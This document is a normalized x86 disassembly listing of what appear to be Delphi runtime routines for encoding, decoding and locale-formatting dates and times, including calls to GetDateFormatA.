jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4098d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_409868
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407ea4
sub_409918
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409824
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407e88
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407e88
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407e88
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409974
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_4099b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409974
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409a78
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_4099b0
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407ea4
sub_409aa8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409824
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407e88
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407e88
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407e88
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409974
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409bf4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409aa8
pop esi
pop ecx
pop ebp
retn 0x8
sub_409c14
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409824
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409c50
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4029b0
sub_409c94
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_40425c
mov edx eax
mov eax ebx
call sub_409c50
pop ecx
pop ebx
pop ebp
retn
sub_409cb4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408bd4
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409c50
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409d00
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409d2c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409bf4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409d64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409918
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409da4
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409ef2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f9c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404034
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409ef9
lea eax [ ebp - 0x118 ]
call sub_403f9c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40420c
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_40425c
mov edx eax
mov eax [ ebx ]
call sub_40c370
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c4e4
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4044bc
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c480
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404194
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c4e4
mov ecx eax
mov eax ebx
mov edx esi
call sub_40408c
sub_409f0c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409fea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f9c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404034
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404034
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409ff1
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40420c
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_40425c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044bc
sub_40a014
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a795
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a79c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403fc0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c564
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c544
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409c50
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c564
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409c50
pop ecx
mov al [ eax + lookup_table_40a0f7 ]
jmp [ eax * 4 + jump_table_40a130 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409d00
pop ecx
push ebp
call sub_409d2c
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409d00
pop ecx
push ebp
call sub_409d2c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409da4
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409c94
pop ecx
jmp r-xdata
push ebp
call sub_409d00
pop ecx
push ebp
call sub_409d2c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409f0c
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409c94
pop ecx
jmp r-xdata
push ebp
call sub_409d00
pop ecx
push ebp
call sub_409d2c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409d00
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409d00
pop ecx
push ebp
call sub_409d64
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409d00
pop ecx
push ebp
call sub_409d64
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409d00
pop ecx
push ebp
call sub_409d64
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409d00
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409d00
pop ecx
push ebp
call sub_409d64
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409d64
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408a44
test eax eax
jne r-xdata
push ebp
call sub_409d00
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a014
pop ecx
push ebp
call sub_409d64
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409cb4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409cb4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409cb4
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409d2c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409cb4
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409cb4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409cb4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a014
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a014
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409cb4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408a44
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409c50
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a014
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409c50
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409c50
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409c94
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409c14
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409c94
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408a44
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409c50
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409c50
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409c94
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409c14
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409c94
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c564
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408a44
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409c50
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a014
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409cb4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408a44
test eax eax
jne r-xdata
push ebp
call sub_409d2c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409c14
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409c94
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409c94
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409c94
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c564
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a014
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409c50
pop ecx
jmp r-xdata
push ebp
call sub_409d2c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409c14
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409c94
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408a44
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408a44
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408a44
test eax eax
jne r-xdata
jmp r-xdata
sub_40a7c8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a014
pop ecx
push ebp
mov eax ebx
call sub_40a014
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_40408c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a838
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_40425c
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a85c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a838
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_40425c
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a8f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a969
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a970
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a838
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_40425c
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4044bc
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_408144
test eax eax
jne r-xdata
mov eax edi
call sub_40425c
add [ esi ] eax
mov bl 0x1
sub_40a97c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a838
mov eax esi
call sub_40425c
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a9b4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_40425c
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40aa00
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_40425c
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c5a8
mov [ ebx ] eax
jmp r-xdata
sub_40aa48
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
